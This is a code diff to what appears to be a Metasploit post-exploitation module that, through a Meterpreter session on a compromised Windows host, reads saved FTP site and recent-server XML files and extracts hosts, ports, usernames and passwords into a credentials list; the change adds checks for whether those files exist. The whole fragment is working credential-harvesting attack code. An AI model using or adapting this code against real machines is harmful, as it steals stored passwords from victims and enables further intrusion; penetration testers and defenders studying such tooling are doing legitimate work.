@@ -171,21 +171,32 @@ class Metasploit3 < Msf::Post
 				creds << parse_accounts(recents) unless recents =~ /No such file/i
 			else
 				type = :meterp
-				sites = session.fs.file.new("#{path}\\sitemanager.xml", "rb")
-				until sites.eof?
-					sitedata << sites.read
+				sitexml = "#{path}\\sitemanager.xml"
+				present = session.fs.file.stat(sitexml) rescue nil
+				if present
+					sites = session.fs.file.new(sitexml, "rb")
+					until sites.eof?
+						sitedata << sites.read
+					end
+					sites.close
+					creds = [parse_accounts(sitedata)]
+				else
+					print_status("No saved connections where found")
 				end
-				sites.close
-				creds = [parse_accounts(sitedata)]
 
-				recents = session.fs.file.new("#{path}\\recentservers.xml", "rb")
-				until recents.eof?
-					recentdata << recents.read
+				recent_file = "#{path}\\recentservers.xml"
+				recent_present = session.fs.file.stat(recent_file) rescue nil
+				if recent_present
+					recents = session.fs.file.new(recent_file, "rb")
+					until recents.eof?
+						recentdata << recents.read
+					end
+					recents.close
+					creds << parse_accounts(recentdata)
+				else
+					print_status("No recent connections where found.")
 				end
-				recents.close
-				creds << parse_accounts(recentdata)
 			end
-
 			creds.each do |cred|
 				cred.each do |loot|
 					credentials << [loot['host'], loot['port'], loot['logontype'], loot['user'], loot['password']]
